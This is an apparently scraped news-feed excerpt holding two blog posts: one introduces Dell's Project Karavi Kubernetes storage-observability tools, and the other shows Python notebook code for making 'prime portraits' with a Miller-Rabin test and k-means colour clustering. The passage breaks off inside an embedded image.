<p><span>In the fast-moving, competitive, and technology-driven business environment, companies are adopting containers/Kubernetes to accelerate cloud-native-application development and value release to the customers. Kubernetes use cases outgrew the basic webserver type of apps and today include mission-critical workloads such as databases. Customers expect enterprise-class features such as encryption, replication (Disaster Recovery), etc. to be offered for Kubernetes,&nbsp;even if the&nbsp;Container Storage Interface does remain ignorant of such capabilities. The Karavi project objective is to expose enterprise storage features to Kubernetes users.<br>
</span></p>
<p><span>Project Karavi aims at improving the observability, usability and data mobility for stateful applications with Dell Technologies Storage portfolio. Project Karavi together with the CSI plugins and the pioneering app-aware, app-consistent backup and recovery solutions form the most comprehensive enterprise grade Storage and Data Protection solutions for Kubernetes from Dell Technologies.</span></p>
<p><span>Project Karavi is currently in tech-preview and includes Karavi Observability<br>
</span></p>
<p>Karavi Observability is part of the Project Karavi that covers Kubernetes storage features and functionality for Dell EMC storage portfolio. Karavi Observability provides standardized approaches for storage observability.</p>
<p><img src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing2.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing2.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>This project brings capacity and performance metrics collection as well as basic storage topology by pulling the data from the storage array and the CSI drivers and sending it to Grafana and Prometheus, community-driven open source tools which became the de-facto standard for collecting and visualizing various Kubernetes ecosystem metrics.</p>
<p>Karavi Observability currently has the following services:</p>
<div>
<table>
<colgroup>
<col>
<col>
<col></colgroup>
<tbody>
<tr>
<td>
<p><strong>Karavi Observability Service</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>Repository</strong></p>
</td>
</tr>
<tr>
<td>Karavi Metrics for PowerFlex</td>
<td>Karavi Metrics for PowerFlex captures telemetry data about Kubernetes storage usage and performance obtained through the CSI (Container Storage Interface) Driver for Dell EMC PowerFlex. The metrics service pushes it to the OpenTelemetry Collector, so it can be processed, and exported in a format consumable by Prometheus. Prometheus can then be configured to scrape the OpenTelemetry Collector exporter endpoint to provide metrics so they can be visualized in Grafana. Please visit the repository for more information.</td>
<td><a href="https://github.com/dell/karavi-metrics-powerflex"><span>Karavi Metrics for PowerFlex</span></a></td>
</tr>
<tr>
<td>Karavi Topology</td>
<td>Karavi Topology provides Kubernetes administrators with the topology data related to containerized storage that are provisioned by a CSI (Container Storage Interface) Driver for Dell EMC storage products. Please visit the repository for more information.</td>
<td><a href="https://github.com/dell/karavi-topology"><span>Karavi Topology</span></a></td>
</tr>
</tbody>
</table>
</div>
<p><span>Each of the services listed above can be deployed independently by the documentation provided in the associated repositories. Alternatively, the services can all be deployed together as part of a single deployment of the Karavi Observability solution.<br>
</span></p>
<p><span>This project is deployed using Helm. Usage information and available release versions can be found here:&nbsp;<a href="https://github.com/dell/helm-charts/tree/main/charts/karavi-observability"><span>Karavi Observability</span></a>.</span></p>
<p><img src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing3.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing3.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><span>This application requires the following third-party components to be deployed in the same Kubernetes cluster as the karavi-metrics-powerflex service:<br>
</span></p>
<ul>
<li>
<p><span>Prometheus<br>
</span></p>
</li>
<li>
<p><span>Grafana<br>
</span></p>
</li>
</ul>
<p><span><strong>Prometheus<br>
</strong></span></p>
<p><span>As part of the Karavi Observability deployment, the OpenTelemetry Collector gets deployed. The OpenTelemetry Collector is what the Karavi metrics services use to push metrics to that can be consumed by Prometheus. This means that Prometheus must be configured to scrape the metrics data from the OpenTelemetry Collector.<br>
</span></p>
<h3><span>Grafana</span></h3>
<p><span>The Grafana dashboards require Grafana to be deployed in the same Kubernetes cluster as the Karavi Observability services.</span></p>
<p><span>Once Grafana and Prometheus are properly configured, customers can import the pre-built observability dashboards, of course, each dashboard can be edited, and customers can build their own customized dashboards</span></p>
<div>
<table>
<colgroup>
<col>
<col></colgroup>
<tbody>
<tr>
<td><span>I/O Performance by node dashboard</span></td>
<td><span>Provides visibility into the I/O performance metrics (IOPS, bandwidth, latency) by Kubernetes node<br>
</span>
<p><img src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing4.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing4.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><span><br>
</span></p></td>
</tr>
<tr>
<td><span>I/O Performance by volume dashboard</span></td>
<td><span>Provides visibility into the I/O performance metrics (IOPS, bandwidth, latency) by volume<br>
</span>
<p><img src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing5.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing5.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></td>
</tr>
<tr>
<td><span>Storage consumption dashboard</span></td>
<td><span>Provides visibility into the total, used, and available capacity for a storage class and associated underlying storage construct.<br>
</span>
<p><img src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing6.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing6.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></td>
</tr>
<tr>
<td><span>Topology dashboard</span></td>
<td><span>Provides visibility into Dell EMC CSI (Container Storage Interface) driver provisioned volume characteristics in Kubernetes correlated with volumes on the storage system.<br>
</span>
<p><img src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing7.png?w=760&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/volumes.blog/wp-content/uploads/2020/12/121720_1007_Introducing7.png?w=760&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></td>
</tr>
</tbody>
</table>
</div>
<p>Together with the new <span>PowerFlex HTLM5 UI, Karavi Observability provides end to end performance monitoring solution for Kubernetes cloud native applications running on PowerFlex, from the PowerFlex storage building blocks â€“ to the application persistent volumes.</span></p>
<p>For more information:</p>
<p>Official GitHub Page <a href="https://github.com/dell/karavi/">https://github.com/dell/karavi/</a></p>
<p>Dell Container Community : <a href="https://www.dell.com/community/Containers/bd-p/Containers">https://www.dell.com/community/Containers/bd-p/Containers</a></p>
<p>You can watch a demo, showing how it all works, below</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/Fmmv-nP06QU?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>

	
	</section>

	<div>
		<p><img alt="" src="https://secure.gravatar.com/avatar/ebad424df0120cc6fde01b307ebf399d?s=140&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/ebad424df0120cc6fde01b307ebf399d?s=280&amp;d=identicon&amp;r=g 2x" height="140" width="140" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><h2><a href="https://volumes.blog/author/itzikr/">itzikr</a></h2>
		<p>Working For DellEMC as a VP &amp; CTO For XtremIO</p>
	</div>

</article></div>]]>
            </description>
            <link>https://volumes.blog/2020/12/17/introducing-project-karavi-extending-the-kubernetes-csi-capabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505240</guid>
            <pubDate>Tue, 22 Dec 2020 11:32:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Painting by Prime Number (2018)]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25504887">thread link</a>) | @rmeertens
<br/>
December 22, 2020 | http://www.pinchofintelligence.com/painting-by-prime-number/ | <a href="https://web.archive.org/web/*/http://www.pinchofintelligence.com/painting-by-prime-number/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					    <div>

<div>
<div>
<p>Two weeks ago I stumbled upon the concept of <a href="http://archive.bridgesmathart.org/2016/bridges2016-359.pdf">prime portraits</a>. In short, prime portraits are pictures in which each color is assigned a number. When we align every pixel, the result should be a prime number. Because I could not find the code used in the article, I decided to recreate these prime portraits in Python â€“ in color! Below is the Jupyter Notebook with the code (<a href="https://github.com/rmeertens/prime_portraitshttps://github.com/rmeertens/prime_portraits">also available on Github</a>) I used to generate the Mona Lisa:</p>
<p><img src="http://www.pinchofintelligence.com/wp-content/uploads/2018/05/monalisa-prime.png" alt="mona lisa"></p>
<h2 id="The-concept">The concept</h2>
<p>A prime portrait is a prime number formatted as a matrix with X digits per line. When we select a color for each digit, we can generate an image.</p>
<p>Instead of doing this for many prime numbers and color schemes until you find something that resembles a known image, I have turned the process around. I have taken iconic images, such as the Mona Lisa and Starry Night, and converted them to images with only 10 colors. I assigned a digit to each color. Then I generated many similar images with a little bit of â€˜noiseâ€™ added. The noise changed the colors in the images slightly, and thus the digits. If the digits in the image formed a prime number, I found a prime portrait!</p>
<p><img src="http://www.pinchofintelligence.com/wp-content/uploads/2018/06/starrynight-prime-386kb.png" alt="starry night"></p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>
<span>%</span><span>matplotlib</span> <span>inline</span>

<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>skimage.transform</span>
<span>import</span> <span>skimage.io</span>
<span>from</span> <span>sklearn.cluster</span> <span>import</span> <span>KMeans</span>
<span>import</span> <span>scipy.misc</span>
<span>from</span> <span>PIL</span> <span>import</span> <span>Image</span><span>,</span> <span>ImageFont</span><span>,</span> <span>ImageDraw</span>

<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>

<span>from</span> <span>multiprocessing</span> <span>import</span> <span>Pool</span>
<span>import</span> <span>time</span>
<span>import</span> <span>random</span>
<span>import</span> <span>warnings</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Testing-for-primality">Testing for primality</h2>
<p>When working with extremely long primes, the naive method of testing each divisor will take way too much time. There are a lot of prime numbers and checking your number for each possible divisor takes too long to test a lot of prime portraits.</p>
<p>Instead we take a probabilistic approach to the prime numbers. The <a href="https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test">Miller Rabin</a> test uses heuristics to determine if a number is (probably) prime or not. I downloaded the <a href="https://rosettacode.org/wiki/Miller%E2%80%93Rabin_primality_test#Python:_Probably_correct_answers">following code for the Miller-Rabin primality test from Rosetta code</a> to check for primality:</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>try_composite</span><span>(</span><span>a</span><span>,</span> <span>d</span><span>,</span> <span>n</span><span>,</span> <span>s</span><span>):</span>
    <span># test the base a to see whether it is a witness for the compositeness of n</span>
    <span>if</span> <span>pow</span><span>(</span><span>a</span><span>,</span> <span>d</span><span>,</span> <span>n</span><span>)</span> <span>==</span> <span>1</span><span>:</span>
        <span>return</span> <span>False</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>s</span><span>):</span>
        <span>if</span> <span>pow</span><span>(</span><span>a</span><span>,</span> <span>2</span><span>**</span><span>i</span> <span>*</span> <span>d</span><span>,</span> <span>n</span><span>)</span> <span>==</span> <span>n</span><span>-</span><span>1</span><span>:</span>
            <span>return</span> <span>False</span>
    <span>return</span> <span>True</span> <span># n is definitely composite</span>

    
<span>def</span> <span>is_probable_prime</span><span>(</span><span>n</span><span>,</span> <span>mrpt_num_trials</span> <span>=</span> <span>5</span><span>):</span>
    <span>"""</span>
<span>    Miller-Rabin primality test.</span>
 
<span>    A return value of False means n is certainly not prime. A return value of</span>
<span>    True means n is very likely a prime.</span>

<span>    """</span>
    <span>assert</span> <span>n</span> <span>&gt;=</span> <span>2</span>
    <span># special case 2</span>
    <span>if</span> <span>n</span> <span>==</span> <span>2</span><span>:</span>
        <span>return</span> <span>True</span>
    <span># ensure n is odd</span>
    <span>if</span> <span>n</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
        <span>return</span> <span>False</span>
    <span># write n-1 as 2**s * d</span>
    <span># repeatedly try to divide n-1 by 2</span>
    <span>s</span> <span>=</span> <span>0</span>
    <span>d</span> <span>=</span> <span>n</span><span>-</span><span>1</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>quotient</span><span>,</span> <span>remainder</span> <span>=</span> <span>divmod</span><span>(</span><span>d</span><span>,</span> <span>2</span><span>)</span>
        <span>if</span> <span>remainder</span> <span>==</span> <span>1</span><span>:</span>
            <span>break</span>
        <span>s</span> <span>+=</span> <span>1</span>
        <span>d</span> <span>=</span> <span>quotient</span>
    <span>assert</span><span>(</span><span>2</span><span>**</span><span>s</span> <span>*</span> <span>d</span> <span>==</span> <span>n</span><span>-</span><span>1</span><span>)</span>
                                     
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>mrpt_num_trials</span><span>):</span>
        <span>a</span> <span>=</span> <span>random</span><span>.</span><span>randrange</span><span>(</span><span>2</span><span>,</span> <span>n</span><span>)</span>
        <span>if</span> <span>try_composite</span><span>(</span><span>a</span><span>,</span> <span>d</span><span>,</span> <span>n</span><span>,</span> <span>s</span><span>):</span>
            <span>return</span> <span>False</span>
        
    <span>return</span> <span>True</span> <span># no base tested showed n as composite</span>

<span>assert</span> <span>is_probable_prime</span><span>(</span><span>2</span><span>)</span>
<span>assert</span> <span>is_probable_prime</span><span>(</span><span>3</span><span>)</span>
<span>assert</span> <span>not</span> <span>is_probable_prime</span><span>(</span><span>4</span><span>)</span>
<span>assert</span>  <span>is_probable_prime</span><span>(</span><span>5</span><span>)</span>
<span>assert</span> <span>not</span> <span>is_probable_prime</span><span>(</span><span>123456789</span><span>)</span>
<span>primes_under_1000</span> <span>=</span> <span>[</span><span>i</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>,</span> <span>1000</span><span>)</span> <span>if</span> <span>is_probable_prime</span><span>(</span><span>i</span><span>)]</span>
<span>assert</span> <span>len</span><span>(</span><span>primes_under_1000</span><span>)</span> <span>==</span> <span>168</span>
<span>assert</span> <span>primes_under_1000</span><span>[</span><span>-</span><span>10</span><span>:]</span> <span>==</span> <span>[</span><span>937</span><span>,</span> <span>941</span><span>,</span> <span>947</span><span>,</span> <span>953</span><span>,</span> <span>967</span><span>,</span> <span>971</span><span>,</span> <span>977</span><span>,</span> <span>983</span><span>,</span> <span>991</span><span>,</span> <span>997</span><span>]</span>
<span>assert</span> <span>is_probable_prime</span><span>(</span><span>6438080068035544392301298549614926991513861075340134</span>\
<span>3291807343952413826484237063006136971539473913409092293733259038472039</span>\
<span>7133335969549256322620979036686633213903952966175107096769180017646161</span>\
<span>851573147596390153</span><span>)</span>
<span>assert</span> <span>not</span> <span>is_probable_prime</span><span>(</span><span>7438080068035544392301298549614926991513861075340134</span>\
<span>3291807343952413826484237063006136971539473913409092293733259038472039</span>\
<span>7133335969549256322620979036686633213903952966175107096769180017646161</span>\
<span>851573147596390153</span><span>)</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Generating-the-images">Generating the images</h2>
<p>The basis of the algorithm is generating images with only 10 possible color values. I did not know what a common approach to this is, so I thought applying a <a href="https://en.wikipedia.org/wiki/K-means_clustering">k-means algorithm</a> would work. To do this, I reshaped an input image (so each pixel is a point in 3D space), clustered this, and used the 10 created clusters as color values. Sidenote: when your hammer is machine learning, everything looks like a nailâ€¦</p>
<p>Important for the prime generation is that you add a little bit of noise to the original image to create images that look the same, but are slightly different. This means that you created a different number, which is a new chance for us to find a prime number.</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>get_k_means</span><span>(</span><span>image</span><span>):</span>
    <span>pointcloud</span> <span>=</span> <span>np</span><span>.</span><span>reshape</span><span>(</span><span>image</span><span>,</span> <span>(</span><span>-</span><span>1</span><span>,</span> <span>3</span><span>))</span>
    <span>kmeans</span> <span>=</span> <span>KMeans</span><span>(</span><span>n_clusters</span><span>=</span><span>10</span><span>)</span><span>.</span><span>fit</span><span>(</span><span>pointcloud</span><span>)</span>
    <span>return</span> <span>kmeans</span>

<span>def</span> <span>create_numbered_image</span><span>(</span><span>image</span><span>,</span> <span>kmeans</span><span>):</span>
    <span>"""</span>
<span>    Turns an RGB image into an image with the labels of clusters of the supplied kmeans classifier. </span>
<span>    """</span>
    <span># apply noise</span>
    <span>stdev</span> <span>=</span> <span>np</span><span>.</span><span>std</span><span>(</span><span>image</span><span>)</span>
    <span>random_noise</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>random_sample</span><span>(</span><span>size</span><span>=</span><span>image</span><span>.</span><span>shape</span><span>)</span><span>*</span><span>(</span><span>stdev</span><span>/</span><span>3</span><span>)</span>
    <span>image</span> <span>=</span> <span>image</span> <span>+</span> <span>random_noise</span>
    
    <span>orig_shape</span> <span>=</span> <span>image</span><span>.</span><span>shape</span>
    <span>image</span> <span>=</span> <span>np</span><span>.</span><span>reshape</span><span>(</span><span>image</span><span>,</span> <span>(</span><span>-</span><span>1</span><span>,</span> <span>3</span><span>))</span>

    <span>numbered_image</span> <span>=</span> <span>kmeans</span><span>.</span><span>predict</span><span>(</span><span>image</span><span>)</span>
    <span>numbered_image</span> <span>=</span> <span>np</span><span>.</span><span>reshape</span><span>(</span><span>numbered_image</span><span>,</span> <span>orig_shape</span><span>[:</span><span>2</span><span>])</span>
    
    <span># make sure the end is uneven</span>
    <span>if</span> <span>numbered_image</span><span>[</span><span>-</span><span>1</span><span>,</span><span>-</span><span>1</span><span>]</span><span>%</span><span>2</span><span>==</span><span>0</span><span>:</span>
        <span>numbered_image</span><span>[</span><span>-</span><span>1</span><span>,</span><span>-</span><span>1</span><span>]</span> <span>+=</span> <span>1</span>

    <span>return</span> <span>numbered_image</span>

<span>def</span> <span>numbered_image_to_normal_image</span><span>(</span><span>numbered_image</span><span>,</span> <span>kmeans</span><span>):</span>
    <span>"""</span>
<span>    Turns an image with only values between 0 and 9 into a colored image by using the cluster centers </span>
<span>    of the supplied kmeans classifier. </span>
<span>    """</span>
    <span>shape</span> <span>=</span> <span>(</span><span>numbered_image</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],</span> <span>numbered_image</span><span>.</span><span>shape</span><span>[</span><span>1</span><span>],</span> <span>3</span><span>)</span>
    <span>image</span> <span>=</span> <span>np</span><span>.</span><span>zeros</span><span>(</span><span>shape</span><span>)</span>
    <span>for</span> <span>label</span><span>,</span> <span>color</span> <span>in</span> <span>zip</span><span>(</span><span>range</span><span>(</span><span>10</span><span>),</span> <span>kmeans</span><span>.</span><span>cluster_centers_</span><span>):</span>
        <span>image</span><span>[</span><span>numbered_image</span><span>==</span><span>label</span><span>]</span> <span>=</span> <span>color</span>
    <span>return</span> <span>image</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h3 id="Numerised-image-examples">Numerised image examples</h3>
<p>Here I create a few examples of small numerised images of the Mona Lisa. If you look closely you can see each image is slightly different, but you can still recognise the original picture. This is crucial for us, as this allows us to generate multiple numerised images that we can test for primality.</p>
</div>
</div>
</div>
<div>
<div>
<p>In&nbsp;[4]:</p>
<div>
<div>
<div>
<pre><span>def</span> <span>load_and_resize_image</span><span>(</span><span>filename</span><span>,</span> <span>resize_factor</span><span>=</span><span>18</span><span>):</span>
    <span>image</span> <span>=</span> <span>skimage</span><span>.</span><span>io</span><span>.</span><span>imread</span><span>(</span><span>filename</span><span>)</span>
    <span>image</span> <span>=</span> <span>image</span><span>.</span><span>astype</span><span>(</span><span>np</span><span>.</span><span>float64</span><span>)</span>
    <span>image</span> <span>=</span> <span>image</span> <span>/</span> <span>255.</span>
    
    <span>oldshape</span> <span>=</span> <span>image</span><span>.</span><span>shape</span>
    <span>with</span> <span>warnings</span><span>.</span><span>catch_warnings</span><span>():</span>
        <span>warnings</span><span>.</span><span>simplefilter</span><span>(</span><span>"ignore"</span><span>)</span>
        <span>resized_image</span> <span>=</span> <span>skimage</span><span>.</span><span>transform</span><span>.</span><span>resize</span><span>(</span><span>image</span><span>,</span> <span>(</span><span>oldshape</span><span>[</span><span>0</span><span>]</span><span>//</span><span>resize_factor</span><span>,</span> <span>oldshape</span><span>[</span><span>1</span><span>]</span><span>//</span><span>resize_factor</span><span>))</span>

    <span>return</span> <span>resized_image</span>

<span>resized_image</span> <span>=</span> <span>load_and_resize_image</span><span>(</span><span>'input_pictures/monalisa.jpg'</span><span>)</span>
<span>kmeans</span> <span>=</span> <span>get_k_means</span><span>(</span><span>resized_image</span><span>)</span>
<span>N_IMAGES</span> <span>=</span> <span>3</span>

<span>f</span><span>,</span> <span>axarr</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>1</span><span>,</span><span>N_IMAGES</span><span>)</span>

<span>for</span> <span>index</span> <span>in</span> <span>range</span><span>(</span><span>N_IMAGES</span><span>):</span>
    <span>n_image</span> <span>=</span> <span>create_numbered_image</span><span>(</span><span>resized_image</span><span>,</span> <span>kmeans</span><span>)</span>
    <span>normal_image</span> <span>=</span> <span>numbered_image_to_normal_image</span><span>(</span><span>n_image</span><span>,</span> <span>kmeans</span><span>)</span>
    <span>axarr</span><span>[</span><span>index</span><span>]</span><span>.</span><span>imshow</span><span>(</span><span>normal_image</span><span>)</span>
</pre>
</div>
</div>
</div>
</div>
<div>
<div>
<div>

<p><img src="data:image/png;base64,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 atd+WFW0KO3la4INg/a+Rx8sbxa1NH58xdI5b3/iP6otjFsS5hrYtOy94tgw5RpdKVNB5o8++HJx LMw1GHvo8e9Fs5mXxWMetieWhLlGbaxLy1cBbdzxGqia64aLyvf5Tx3uu+0ZupndbWaHzOylWbct N7PHzGxP6+v5He4PDUK2OZHr6OrkLZetkq7/0G1flfSEu6+T9ETrZwyfrSLbjLaKXEdS24Lu7s9I Ovyhm2+UdE/r+3skfb7meaEPyDYnch1dVd9DX+nuB1rfvyWp+LlcM9ssabMknbO4fyvloLKOsiXX oUOuI6DrLhd3d0kejG9x9wl3n/jIGC+QYRJlS67Di1zzqlrQD5rZKklqfZ1/iwOaimxzItcRUPUt l4cl3SLpjtbXh7qdSNSaGNk9WT6LqNJy1UtP7Sq3Cx46cqI4tmJZ+Sp0ax94sjh2/PLL57z92E/L V6dTzdlWzTV6rq69Ipx/3zUl1zbIdZ6GJNcP6KRt8X5J35X0CTPbZ2a3auZF8Vkz2yPpM62fMWTI NidyHV1tz9Dd/ebC0Kdrngv6jGxzItfRxUf/ASAJCjoAJEFBB4AkKOgAkAQFHQCS6Ovlc09MWblv PLiMZWR87Yri2L5guz9/qPy5ivHdu8v3aeX9SdLeoHd19dLTxbFrryj30z+1q7y/sK9Xcz+Os06U e2irOHrCgnlUy3V1cCnVKIMo10iUuRQ/z/3O9TI7Ut6wRr3I9bIrR/t4jT43M15DrpyhA0ASFHQA SIKCDgBJUNABIAkKOgAkQUEHgCT62rYYrSIeXY7zznvfDu61fKnKqO0ocjhoddq7s7y/bkRtapHo MZYux3n6+z+utK+Ssxcv1GVXzr3m8IYN5ZfYfdsOFsf2Hw3ONYIMLitvFXqu4vPfTi9yXb5uWXnD xyvtbk5LF3vxkrbR8RrnWu34iXIdpuN1fO0FxbE6cuUMHQCSoKADQBIUdABIgoIOAElQ0AEgCQo6 ACTR17bFkxorXv3sqaA1sdQSJ0nH95Vb8KLWt9XBdrHqfwNfePNkcWzFssWV7jN6jON75r562/SJ uVtHeyFqYYtauKJ8osccvR5i/c81WjleKm9XyrVu0fG6O0muUQaHgqd5/YWLimPR44jaKKu23M7G GToAJEFBB4AkKOgAkAQFHQCSoKADQBIUdABIom3bopndLelXJR1y959v3fZnkn5P0plew6+5+yPd 